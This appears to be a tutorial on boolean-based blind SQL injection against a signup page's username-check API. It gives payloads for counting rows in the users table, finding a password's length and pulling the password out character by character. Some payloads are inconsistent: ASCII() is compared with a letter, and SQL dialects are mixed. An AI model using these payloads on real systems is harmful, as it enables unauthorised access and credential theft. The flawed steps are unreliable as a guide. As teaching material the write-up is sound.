As the name describes this type of attack happens when the SQLi is blind which means we won't get a clear-text output back from the back-end but in this case you will get a sort of Boolean(True/False)
no matter if you perform a success of failure.

# Case Scenario
You have a register user page that let's you create your user. Before registration the back-end performs a username check to see if the username is in use or not by returning taken=TRUE/FALSE

--------------------------------------------------------------------------------------------------------------------------------

//Identify the vulnerability
1)You can see from the HTML source code that the username field calls a JS function when the mouse is moved out of the field:
```
<input type="text" class="form-control" id="usernameInput" aria-describedby="usernameHelp" placeholder="Use something cool!" onfocusout="checkUsername()">
```

2)Checking the attacked JS script **signup.js** shows
```
function checkUsername() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            var json = JSON.parse(xhr.responseText);
            var username = document.getElementById("usernameInput").value;
            username = username.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
            var usernameHelp = document.getElementById("usernameHelp");
            
            if (json['status'] === 'available') {
                usernameHelp.innerHTML = "<span style='color:green'>The username '" + username + "' is <b>available</b></span>";
            } else {
                usernameHelp.innerHTML = "<span style='color:red'>The username '" + username + "' is <b>taken</b>, please use a different one</span>";
            }
        }
    };
    xhr.open("GET", "/api/check-username.php?u=" + document.getElementById("usernameInput").value, true);
    xhr.send();
}

```

3)The function performs a kind of cleanup, plus it sends the inputted username to `/api/check-username.php?u=`

4)Now we need to use a known used username (maria) otherwise all the usernames will fail and response "available" no matter if condition match true or not(false).

5)Sending:
```
< maria' AND 1=0--
should be evalutated as false(maria exist=true and 1=0=false which in the totallity results as FALSE) which should return username=available(aka bool=false)
```
--------------------------------------------------------------------------------------------------------------------------------

# Attacking the SQLi
1)The first step is to identify the numbers of rows in the user table: maria' AND (select count(*) from users) >= 0-- -
`maria' AND (select count(*) from users) >= 1-- -`
`maria' AND (select count(*) from users) >= 2-- -`
(Repeat until you get "available"=aka false)

2)Next we need to identify the length of a field example password: maria' AND LEN(password)> 0-- -
`maria' AND LEN(password)> 1-- -`
`maria' AND LEN(password)> 2-- -`
`maria' AND LEN(password)> 20-- -`
(Repeat until you get "available"=aka false)

3)Now that you have the password length you can ex-filtrate the password in a for loop where i<length(from step 3): `maria' AND SUBSTRING(password,1,1)=A-- -`
```
maria' AND ASCII(SUBSTRING(password,2,1))=A-- -
maria' AND ASCII(SUBSTRING(password,3,1))=A-- -
maria' AND ASCII(SUBSTRING(password,4,1))=A-- -
maria' AND ASCII(SUBSTRING(password,5,1))=A-- -
```

(Repeat until you get "taken"=true) -> In this case since maria=True(exist) we have and AND in between which means if the ***substring=Char*** is true then you should get TRUE & TRUE = taken(this will be the stop)

--------------------------------------------------------------------------------------------------------------------------------
## Automation
These steps can be automated, please use the python script in the folder and adapt it to your needs!